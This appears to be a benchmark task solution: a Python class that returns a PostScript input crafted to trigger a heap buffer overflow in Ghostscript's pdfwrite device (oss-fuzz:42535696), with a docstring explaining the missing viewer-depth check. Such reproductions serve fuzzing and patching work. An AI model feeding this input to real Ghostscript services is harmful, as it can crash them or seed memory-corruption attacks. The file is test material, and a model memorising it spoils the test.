import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in pdfwrite (oss-fuzz:42535696).
        The vulnerability occurs when pdfwrite attempts to restore viewer state without checking
        if the viewer depth is at least 1. This can be triggered by desynchronizing the
        device's internal state tracking from the interpreter's state stack, typically via
        a device reset (setpagedevice) inside a save/restore block.
        """
        return (
            b"%!PS\n"
            b"<< /OutputDevice /pdfwrite /OutputFile (/dev/null) >> setpagedevice\n"
            b"gsave\n"
            b"0 0 100 100 rectfill\n"
            b"/S save def\n"
            b"<< /PageSize [300 300] >> setpagedevice\n"
            b"S restore\n"
            b"grestore\n"
        )